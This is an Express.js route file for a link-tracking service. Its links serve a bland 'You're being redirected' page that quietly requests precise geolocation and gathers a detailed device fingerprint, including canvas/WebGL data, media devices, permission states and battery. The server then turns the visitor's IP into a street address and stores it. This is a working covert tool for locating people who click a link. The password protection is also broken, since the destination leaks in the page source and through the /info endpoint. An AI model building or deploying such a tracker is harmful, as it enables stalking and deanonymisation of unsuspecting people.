const express = require('express');
const https = require('https');
const http = require('http');
const bcrypt = require('bcryptjs');
const db = require('../db');

const router = express.Router();

function geoLookup(ip) {
  return new Promise((resolve) => {
    const url = `http://ip-api.com/json/${ip}?fields=status,lat,lon,query`;
    http.get(url, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(data);
          if (json.status === 'success') {
            resolve({ lat: json.lat, lng: json.lon, ip: json.query });
          } else {
            resolve(null);
          }
        } catch {
          resolve(null);
        }
      });
    }).on('error', () => resolve(null));
  });
}

function reverseGeocode(lat, lng) {
  return new Promise((resolve) => {
    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&addressdetails=1`;
    const options = {
      headers: { 'User-Agent': 'TrackingLinksApp/1.0' }
    };
    https.get(url, options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(data);
          resolve(json.display_name || null);
        } catch {
          resolve(null);
        }
      });
    }).on('error', () => resolve(null));
  });
}

function getPublicIp() {
  return new Promise((resolve) => {
    http.get('http://ip-api.com/json/?fields=query', (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(data).query); }
        catch { resolve(null); }
      });
    }).on('error', () => resolve(null));
  });
}

function appendUtm(url, link) {
  if (!link.utm_source && !link.utm_medium && !link.utm_campaign) return url;
  const params = [];
  if (link.utm_source) params.push(`utm_source=${encodeURIComponent(link.utm_source)}`);
  if (link.utm_medium) params.push(`utm_medium=${encodeURIComponent(link.utm_medium)}`);
  if (link.utm_campaign) params.push(`utm_campaign=${encodeURIComponent(link.utm_campaign)}`);
  const separator = url.includes('?') ? '&' : '?';
  return url + separator + params.join('&');
}

function trackingPageHtml(link, error) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f2f5; color: #333; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
    .card { background: #fff; border-radius: 8px; padding: 32px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); max-width: 400px; width: 100%; text-align: center; }
    h2 { margin-bottom: 16px; }
    p { margin-bottom: 12px; color: #555; font-size: 0.9rem; }
    input { width: 100%; padding: 10px 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 0.95rem; margin-bottom: 12px; }
    .btn { display: inline-block; padding: 10px 20px; border: none; border-radius: 6px; font-size: 0.95rem; cursor: pointer; background: #0f3460; color: #fff; width: 100%; }
    .btn:hover { opacity: 0.85; }
    .error { color: #e74c3c; font-size: 0.85rem; margin-top: 8px; }
    .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0f3460; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 12px auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="card" id="app">
    <h2>You're being redirected</h2>
    <p>Click the button to continue.</p>
    <button class="btn" id="continueBtn">Continue to site</button>
    <p class="text-sm text-muted" style="margin-top:12px;font-size:0.8rem;color:#999;" id="status"></p>
  </div>

  <script>
    const link = ${JSON.stringify({ code: link.code, hasPassword: !!link.password_hash, destination: link.destination, expiresAt: link.expires_at })};

    if (link.expiresAt && new Date(link.expiresAt) < new Date()) {
      document.getElementById('app').innerHTML = '<h2>Link Expired</h2><p>This link is no longer available.</p>';
    }

    function showButton(msg) {
      document.getElementById('app').innerHTML = \`
        <h2>You're being redirected</h2>
        <p>$\{msg}</p>
        <button class="btn" id="continueBtn">Continue to site</button>
        <p class="text-sm text-muted" style="margin-top:12px;font-size:0.8rem;color:#999;" id="status"></p>
      \`;
      document.getElementById('continueBtn').addEventListener('click', requestGeo);
    }

    async function sendClick(clientLat, clientLng, fingerprint) {
      document.getElementById('status').textContent = 'Redirecting...';
      try {
        await fetch('/api/track/' + link.code + '/click', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ clientLat, clientLng, fingerprint })
        });
      } catch (e) {}
      window.location.replace(link.destination);
    }

function getFingerprint() {
      const f = {};
      try { f.language = navigator.language; } catch(e) {}
      try { f.languages = navigator.languages; } catch(e) {}
      try { f.platform = navigator.platform; } catch(e) {}
      try { f.cpuCores = navigator.hardwareConcurrency; } catch(e) {}
      try { f.deviceMemory = navigator.deviceMemory; } catch(e) {}
      try { f.cookiesEnabled = navigator.cookieEnabled; } catch(e) {}
      try { f.doNotTrack = navigator.doNotTrack; } catch(e) {}
      try { f.onLine = navigator.onLine; } catch(e) {}
      try { f.vendor = navigator.vendor; } catch(e) {}
      try { f.vendorSub = navigator.vendorSub; } catch(e) {}
      try { f.product = navigator.product; } catch(e) {}
      try { f.productSub = navigator.productSub; } catch(e) {}
      try { f.appName = navigator.appName; } catch(e) {}
      try { f.appVersion = navigator.appVersion; } catch(e) {}
      try { f.appCodeName = navigator.appCodeName; } catch(e) {}
      try { f.maxTouchPoints = navigator.maxTouchPoints; } catch(e) {}
      try { f.touchSupport = 'ontouchstart' in window; } catch(e) {}
      try { f.pdfViewer = navigator.pdfViewerEnabled; } catch(e) {}
      try { f.webdriver = navigator.webdriver; } catch(e) {}
      try { f.hardwareConcurrency = navigator.hardwareConcurrency; } catch(e) {}
      try { f.javaEnabled = navigator.javaEnabled(); } catch(e) {}
      try { f.oscpu = navigator.oscpu; } catch(e) {}

      try { f.screen = { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth, orientation: screen.orientation?.type, devicePixelRatio: window.devicePixelRatio }; } catch(e) {}
      try { f.window = { innerWidth: window.innerWidth, innerHeight: window.innerHeight, outerWidth: window.outerWidth, outerHeight: window.outerHeight, screenTop: window.screenTop, screenLeft: window.screenLeft }; } catch(e) {}

      try { f.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) {}
      try { f.timezoneOffset = new Date().getTimezoneOffset(); } catch(e) {}
      try { f.locale = Intl.DateTimeFormat().resolvedOptions().locale; } catch(e) {}

      const mq = (q) => window.matchMedia(q).matches;
      try { f.mediaQueries = {
        darkMode: mq('(prefers-color-scheme: dark)'),
        lightMode: mq('(prefers-color-scheme: light)'),
        reducedMotion: mq('(prefers-reduced-motion: reduce)'),
        reducedTransparency: mq('(prefers-reduced-transparency: reduce)'),
        reducedData: mq('(prefers-reduced-data: reduce)'),
        highContrast: mq('(prefers-contrast: more)'),
        lowContrast: mq('(prefers-contrast: less)'),
        forcedColors: mq('(forced-colors: active)'),
        invertedColors: mq('(inverted-colors: inverted)'),
        hdr: mq('(dynamic-range: high)'),
        colorGamut: (mq('(color-gamut: p3)') ? 'p3' : mq('(color-gamut: rec2020)') ? 'rec2020' : 'srgb'),
        pointer: mq('(pointer: fine)') ? 'fine' : mq('(pointer: coarse)') ? 'coarse' : 'none',
        hover: mq('(hover: hover)') ? 'hover' : mq('(hover: none)') ? 'none' : 'unknown',
        anyPointer: mq('(any-pointer: fine)') ? 'fine' : mq('(any-pointer: coarse)') ? 'coarse' : 'none',
        anyHover: mq('(any-hover: hover)') ? 'hover' : 'none',
        scan: mq('(scan: progressive)') ? 'progressive' : 'interlace',
        displayMode: (mq('(display-mode: standalone)') ? 'standalone' : mq('(display-mode: fullscreen)') ? 'fullscreen' : 'browser'),
        monochrome: mq('(monochrome: 0)') ? false : true,
      }; } catch(e) {}

      try { f.connection = {
        type: navigator.connection?.effectiveType,
        downlink: navigator.connection?.downlink,
        rtt: navigator.connection?.rtt,
        saveData: navigator.connection?.saveData,
      }; } catch(e) {}

      try { f.storage = {
        localStorage: !!window.localStorage,
        sessionStorage: !!window.sessionStorage,
        indexedDB: !!window.indexedDB,
        serviceWorker: 'serviceWorker' in navigator,
        webWorker: 'Worker' in window,
        sharedWorker: 'SharedWorker' in window,
      }; } catch(e) {}

      try { f.media = {
        webRTC: !!window.RTCPeerConnection,
        webSocket: !!window.WebSocket,
        canvas: !!document.createElement('canvas').getContext,
        webgl: !!document.createElement('canvas').getContext('webgl'),
        webgl2: !!document.createElement('canvas').getContext('webgl2'),
        webGPU: !!navigator.gpu,
        webAssembly: !!window.WebAssembly,
        audio: !!window.Audio,
        video: !!window.Video,
        geolocation: 'geolocation' in navigator,
        battery: 'getBattery' in navigator,
        vibration: 'vibrate' in navigator,
        webBluetooth: !!navigator.bluetooth,
        webUSB: !!navigator.usb,
        webNFC: !!navigator.nfc,
        webXR: !!navigator.xr,
        webAuth: !!window.PublicKeyCredential,
        webShare: !!navigator.share,
        webPayment: !!window.PaymentRequest,
        bigInt: typeof BigInt !== 'undefined',
        webSocketBinaryType: typeof WebSocket,
      }; } catch(e) {}

      try { const c = document.createElement('canvas'); c.width=256; c.height=256; const ctx=c.getContext('2d'); ctx.textBaseline='top'; ctx.font='14px Arial'; ctx.fillStyle='#f60'; ctx.fillRect(100,100,50,50); ctx.fillStyle='#069'; ctx.fillText('fp',2,15); ctx.fillStyle='rgba(102,204,0,0.7)'; ctx.fillRect(0,50,100,50); f.canvasFingerprint = c.toDataURL().substring(0,200); } catch(e) {}

      try { const gl = document.createElement('canvas').getContext('webgl'); if(gl) { f.webgl = { vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER), version: gl.getParameter(gl.VERSION), shadingVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION), maxTextures: gl.getParameter(gl.MAX_TEXTURE_SIZE), maxViewport: gl.getParameter(gl.MAX_VIEWPORT_DIMS), antialias: gl.getContextAttributes().antialias, depthBits: gl.getParameter(gl.DEPTH_BITS), stencilBits: gl.getParameter(gl.STENCIL_BITS), alphaBits: gl.getParameter(gl.ALPHA_BITS), redBits: gl.getParameter(gl.RED_BITS), greenBits: gl.getParameter(gl.GREEN_BITS), blueBits: gl.getParameter(gl.BLUE_BITS), extensions: gl.getSupportedExtensions().filter(e=>!e.startsWith('WEBGL_debug')).slice(0,30), }; } } catch(e) {}

      try { f.referrer = document.referrer || ''; } catch(e) {}
      try { f.historyLength = window.history.length; } catch(e) {}
      try { f.pageHidden = document.hidden; } catch(e) {}
      try { f.visibilityState = document.visibilityState; } catch(e) {}

      try { f.perf = { timing: performance.timing ? { navType: performance.navigation?.type, redirectCount: performance.navigation?.redirectCount, domTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart, loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart, dnsTime: performance.timing.domainLookupEnd - performance.timing.domainLookupStart, tcpTime: performance.timing.connectEnd - performance.timing.connectStart, ttfb: performance.timing.responseStart - performance.timing.requestStart, downloadTime: performance.timing.responseEnd - performance.timing.responseEnd } : null }; } catch(e) {}

      try { f.cookieCount = document.cookie ? document.cookie.split(';').length : 0; } catch(e) {}

      try { if (navigator.getBattery) { navigator.getBattery().then(function(b) { f.batteryData = { level: b.level, charging: b.charging }; }).catch(function(){}); } } catch(e) {}
      try { if (navigator.mediaDevices) { navigator.mediaDevices.enumerateDevices().then(function(devices) { var d = []; for (var i=0;i<devices.length;i++) { d.push({ kind: devices[i].kind, label: devices[i].label || '(hidden)' }); } f.mediaDevices = d; }).catch(function(){}); } } catch(e) {}
      try { if (navigator.permissions) { navigator.permissions.query({ name: 'camera' }).then(function(s) { f.cameraPermission = s.state; }).catch(function(){}); } } catch(e) {}
      try { if (navigator.permissions) { navigator.permissions.query({ name: 'microphone' }).then(function(s) { f.micPermission = s.state; }).catch(function(){}); } } catch(e) {}
      try { if (navigator.permissions) { navigator.permissions.query({ name: 'geolocation' }).then(function(s) { f.geoPermission = s.state; }).catch(function(){}); } } catch(e) {}

      try { f.sensors = {
        accelerometer: 'Accelerometer' in window,
        gyroscope: 'Gyroscope' in window,
        magnetometer: 'Magnetometer' in window,
        ambientLight: 'AmbientLightSensor' in window,
        proximity: 'ProximitySensor' in window,
      }; } catch(e) {}

      return f;
    }

    function requestGeo() {
      document.getElementById('status').textContent = 'Capturing location...';
      const fp = getFingerprint();
      navigator.geolocation.getCurrentPosition(
        (pos) => sendClick(pos.coords.latitude, pos.coords.longitude, fp),
        () => sendClick(null, null, fp),
        { timeout: 5000, enableHighAccuracy: true }
      );
    }

    if (link.hasPassword) {
      document.getElementById('app').innerHTML = \`
        <h2>Password Required</h2>
        <p>This link is password-protected.</p>
        <input type="password" id="password" placeholder="Enter password" />
        <button class="btn" onclick="verifyPassword()">Submit</button>
        <div id="error" class="error"></div>
      \`;
    } else {
      navigator.geolocation.getCurrentPosition(
        (pos) => sendClick(pos.coords.latitude, pos.coords.longitude, getFingerprint()),
        () => showButton('Click the button to continue.'),
        { timeout: 3000, enableHighAccuracy: false }
      );
    }

    async function verifyPassword() {
      const password = document.getElementById('password').value;
      document.getElementById('error').textContent = '';
      try {
        const res = await fetch('/api/track/' + link.code + '/verify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ password })
        });
        const data = await res.json();
        if (!res.ok) {
          document.getElementById('error').textContent = data.error || 'Wrong password';
          return;
        }
        link.destination = data.destination;
        link.hasPassword = false;
        showButton('Password correct. Click to continue.');
      } catch (e) {
        document.getElementById('error').textContent = 'Network error';
      }
    }
  </script>
</body>
</html>`;
}

router.get('/:code', async (req, res) => {
  const link = await db.get('SELECT * FROM links WHERE code = ?', [req.params.code]);
  if (!link) {
    return res.status(404).send('Link not found');
  }

  if (link.expires_at && new Date(link.expires_at) < new Date()) {
    return res.status(410).send('This link has expired');
  }

  return res.send(trackingPageHtml(link));
});

router.post('/:code/click', async (req, res) => {
  const link = await db.get('SELECT * FROM links WHERE code = ?', [req.params.code]);
  if (!link) return res.status(404).json({ error: 'Link not found' });

  const { clientLat, clientLng, fingerprint } = req.body || {};

  let ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
    || req.socket.remoteAddress
    || '127.0.0.1';

  if (ip === '::1' || ip === '127.0.0.1') {
    ip = await getPublicIp() || ip;
  }

  const geo = ip ? await geoLookup(ip) : null;
  let address = null;
  if (geo) {
    address = await reverseGeocode(geo.lat, geo.lng);
  }

  await db.run(
    'INSERT INTO clicks (link_id, ip, lat, lng, address, client_lat, client_lng, user_agent, fingerprint) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
    [link.id, geo?.ip || ip || null, geo?.lat || null, geo?.lng || null, address, clientLat || null, clientLng || null, req.headers['user-agent'] || null, fingerprint || null]
  );

  res.json({ ok: true });
});

router.post('/:code/info', async (req, res) => {
  const link = await db.get('SELECT * FROM links WHERE code = ?', [req.params.code]);
  if (!link) return res.status(404).json({ error: 'Link not found' });

  const expired = link.expires_at && new Date(link.expires_at) < new Date();

  res.json({
    code: link.code,
    destination: link.destination,
    hasPassword: !!link.password_hash,
    expired
  });
});

router.post('/:code/verify', async (req, res) => {
  const link = await db.get('SELECT * FROM links WHERE code = ?', [req.params.code]);
  if (!link) return res.status(404).json({ error: 'Link not found' });

  const { password } = req.body || {};
  if (!password || !bcrypt.compareSync(password, link.password_hash)) {
    return res.status(401).json({ error: 'Invalid password' });
  }

  res.json({ destination: appendUtm(link.destination, link) });
});

module.exports = router;